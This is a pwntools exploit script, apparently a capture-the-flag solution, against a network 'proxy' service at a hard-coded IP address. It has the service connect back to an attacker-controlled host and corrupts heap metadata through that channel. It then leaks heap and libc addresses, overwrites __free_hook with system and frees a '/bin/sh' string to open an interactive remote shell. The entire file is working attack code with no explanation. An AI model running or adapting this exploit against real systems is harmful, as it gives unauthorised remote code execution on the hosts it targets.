from pwn import *
TARGET_IP ="139.180.221.172"
TARGET_PORT = 9999
ACTOR_IP="104.238.162.113"
#r = process("./proxy")
r= remote(TARGET_IP,9999)
libc=ELF("libc-2.31.so")

context.log_level='debug'
gdb_script="""
c
"""
def create_request(idx,ip,port,nb,buf):
	r.recvuntil(b"/>")
	r.sendline(b"1")
	r.recvuntil(b"Enter request index:")
	r.sendline(str(idx))
	r.recvuntil(b"Enter hostname:")
	r.sendline(ip)
	r.recvuntil(b"Enter port:")
	r.sendline(str(port))
	r.recvuntil(b"Enter input buffer size:")
	r.sendline(str(nb))
	r.recvuntil(b"Fill input buffer")
	r.send(buf)
	r.recvuntil("Done")
def modify_request(idx,ip,port,nb,buf):
	r.recvuntil(b"/>")
	r.sendline(b"2")
	r.recvuntil(b"Enter request index:")
	r.sendline(str(idx))
	r.recvuntil(b"Enter new hostname:")
	r.sendline(ip)
	r.recvuntil(b"Enter new port:")
	r.sendline(str(port))
	r.recvuntil(b"Enter new input buffer size:")
	r.sendline(str(nb))
	r.recvuntil(b"Fill input buffer")
	r.send(buf)
	r.recvuntil("Done")
def delete_request(idx):
	r.recvuntil(b"/>")
	r.sendline(b"3")
	r.recvuntil(b"Enter request index:")
	r.sendline(str(idx))
	r.recvuntil("Done")


create_request(0,ACTOR_IP,7777,0x10,b'1111\n')
client = listen(port=7777,bindaddr ="0.0.0.0",fam ="ipv4",typ="tcp")
client.wait_for_connection()
client.send("1")
client.close()

create_request(1,ACTOR_IP,8888,0x10,b'2222\n')
client = listen(port=8888,bindaddr ="0.0.0.0",fam ="ipv4",typ="tcp")
client.wait_for_connection()
client.send("1")
client.close()

create_request(2,ACTOR_IP,9999,0x10,b'3333\n')
client = listen(port=9999,bindaddr ="0.0.0.0",fam ="ipv4",typ="tcp")
client.wait_for_connection()
client.send("1")
client.close()

create_request(3,ACTOR_IP,4444,0xF00,b'4444\n')
client = listen(port=4444,bindaddr ="0.0.0.0",fam ="ipv4",typ="tcp")
client.wait_for_connection()
client.send("1")
client.close()

delete_request(0)
create_request(0,ACTOR_IP,7777,0x10,b'5555\n')
client = listen(port=7777,bindaddr ="0.0.0.0",fam ="ipv4",typ="tcp")
client.wait_for_connection()

modify_request(0,"/bin/sh",7777,0x40,b'A\n')

client.send(p64(0)+p64(0)+p64(0)+p64(0x0000000000000031)+b'\x70')
client.close()

sleep(2)
r.sendline("4")
r.recvuntil(b"Request index : 2")
r.recvuntil(b"Host : ") 
data=r.recvuntil(b"\n").rstrip().ljust(8,b'\x00')
print(data)
heap_leak=u64(data)-0x540
log.info("heap : "+hex(heap_leak))

#abuse request 1 and 2
#gdb.attach(r,"")
delete_request(3)
modify_request(2,p64(heap_leak+0x960)+p32(1337)+p32(0)+p64(heap_leak)+p32(0x2)+p32(0),1111,0x5,b"1\n")
r.sendline("4")
r.recvuntil(b"Request index : 1")
r.recvuntil(b"Host : ") 
data=r.recvuntil(b"\n").rstrip().ljust(8,b'\x00')
print(data)
leak=u64(data)

libc.address=leak-0x1EBBE0
log.info("libc : "+hex(libc.address))
r.recvuntil(b"/>")
r.sendline(b"4")
r.recvuntil("COMPLETE")
r.recvuntil("COMPLETE")
r.recvuntil("COMPLETE")
modify_request(2,p64(libc.symbols["__free_hook"])+p32(1337)+p32(0)+p64(heap_leak)+p32(0x2)+p32(0),1111,0x5,b"1\n")
modify_request(1,p64(libc.symbols["system"]),1111,0x5,b"1\n")
r.recvuntil(b"/>")
r.sendline(b"3")
r.recvuntil(b"Enter request index:")
r.sendline(str(0))
r.interactive()